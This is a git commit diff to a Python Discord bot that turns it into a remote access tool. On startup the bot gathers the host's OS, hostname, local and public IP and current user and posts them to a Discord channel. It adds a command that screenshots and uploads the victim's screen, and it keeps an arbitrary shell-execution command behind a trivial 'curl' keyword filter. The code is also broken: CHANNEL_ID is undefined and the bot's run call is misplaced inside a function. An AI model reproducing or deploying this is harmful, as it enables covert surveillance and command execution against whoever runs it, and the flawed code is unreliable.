b9e9974e1250fae78adebf75b0143ebc505c99c8
xyqn <135556230+n1d3v@users.noreply.github.com>
2023-09-03 19:57:43 +0100

    Add files via upload

--- app.py
+++ app.py
@@ -1,43 +1,58 @@
+import platform
+import socket
 import discord
 import subprocess
-import psutil  # Import the psutil library
-from discord.ext import commands
+import pyautogui
 import os
-import sys
-import time
+from discord.ext import commands
 
-# Your bot's token
-TOKEN = 'your bot token here'
+TOKEN = 'YOUR_TOKEN'
 
-# Initialize the bot with intents
 intents = discord.Intents.all()
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# Performance monitoring parameters
-CPU_THRESHOLD = 75 # Define the CPU usage threshold (in percentage)
-MEMORY_THRESHOLD = 50  # Define the memory usage threshold (in percentage)
-RESTART_DELAY = 10  # Define the delay before restarting (in seconds)
+prompt_message = None
 
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user.name} ({bot.user.id})')
     print('------')
 
+    system_info = f'OS: {platform.system()} {platform.release()}\n'
+    system_info += f'NT Kernel Version: {platform.version()}\n'
+    system_info += f'Hostname: {socket.gethostname()}\n'
+
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+    public_ip = subprocess.check_output(['curl', '-k', 'ifconfig.me'], text=True).strip()
+    system_info += f'Public IP: {public_ip}\n'
+    system_info += f'Local IP: {local_ip}\n'
+
+    try:
+        whoami_result = subprocess.check_output(['whoami'], text=True).strip()
+    except Exception as e:
+        whoami_result = str(e)
+    
+    system_info += f'WhoAmI: {whoami_result}'
+
+    channel_id = CHANNEL_ID
+    channel = bot.get_channel(channel_id)
+
+    if channel:
+        await channel.send("Bot started. Here are some system details:\n```" + system_info + "```")
+
 @bot.command()
 async def sendcmd(ctx, *, command):
-    # Check if the command starts with '!' (security check)
     if command.startswith('!'):
         await ctx.send('Invalid command. Please do not use "!".')
         return
-    
-    # Check if the command contains 'curl' (or any other blocked command)
+
     if 'curl' in command.lower():
         await ctx.send('The `curl` command is blocked.')
         return
 
     try:
-        # Execute the command in a CMD prompt
         result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
         await ctx.send(f'Command executed successfully:\n```{result}```')
     except subprocess.CalledProcessError as e:
@@ -45,34 +60,53 @@ async def sendcmd(ctx, *, command):
     except Exception as e:
         await ctx.send(f'An error occurred:\n```{str(e)}```')
 
-# Performance monitoring function
-def monitor_performance():
-    while True:
-        cpu_percent = psutil.cpu_percent()
-        memory_percent = psutil.virtual_memory().percent
+@bot.command()
+async def yes(ctx):
+    global prompt_message
+    if prompt_message:
+        await prompt_message.edit(content='Yes')
+        prompt_message = None
 
-        # Check if CPU or memory usage exceeds the threshold
-        if cpu_percent > CPU_THRESHOLD or memory_percent > MEMORY_THRESHOLD:
-            print(f'Performance spike detected (CPU: {cpu_percent}%, Memory: {memory_percent}%)')
-            restart_bot()
-            break
+@bot.command()
+async def no(ctx):
+    global prompt_message
+    if prompt_message:
+        await prompt_message.edit(content='No')
+        prompt_message = None
 
-        time.sleep(10)  # Check every 10 seconds
+@bot.command()
+async def screenshot(ctx):
+    screenshot = pyautogui.screenshot()
 
-# Bot restart function
-def restart_bot():
-    # Delay before restarting
-    time.sleep(RESTART_DELAY)
+    screenshot.save('screenshot.png')
+
+    await ctx.send(file=discord.File('screenshot.png'))
+
+    os.remove('screenshot.png')
+
+@bot.command()
+async def sysinfo(ctx):
+    system_info = f'OS: {platform.system()} {platform.release()}\n'
+    system_info += f'NT Kernel Version: {platform.version()}\n'
+    system_info += f'Hostname: {socket.gethostname()}\n'
+
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+    public_ip = subprocess.check_output(['curl', '-k', 'ifconfig.me'], text=True).strip()
+    system_info += f'Public IP: {public_ip}\n'
+    system_info += f'Local IP: {local_ip}\n'
+
+    try:
+        whoami_result = subprocess.check_output(['whoami'], text=True).strip()
+    except Exception as e:
+        whoami_result = str(e)
     
-    # Restart the bot by launching a new instance of the Python script
-    python_executable = sys.executable
-    os.execl(python_executable, python_executable, *sys.argv)
+    system_info += f'WhoAmI: {whoami_result}'
 
-if __name__ == "__main__":
-    # Start the performance monitoring loop in a separate thread
-    import threading
-    performance_monitoring_thread = threading.Thread(target=monitor_performance)
-    performance_monitoring_thread.start()
+    channel_id = CHANNEL_ID
+    channel = bot.get_channel(channel_id)
 
-    # Run the bot
+    if channel:
+        await channel.send("```" + system_info + "```")
+
     bot.run(TOKEN)
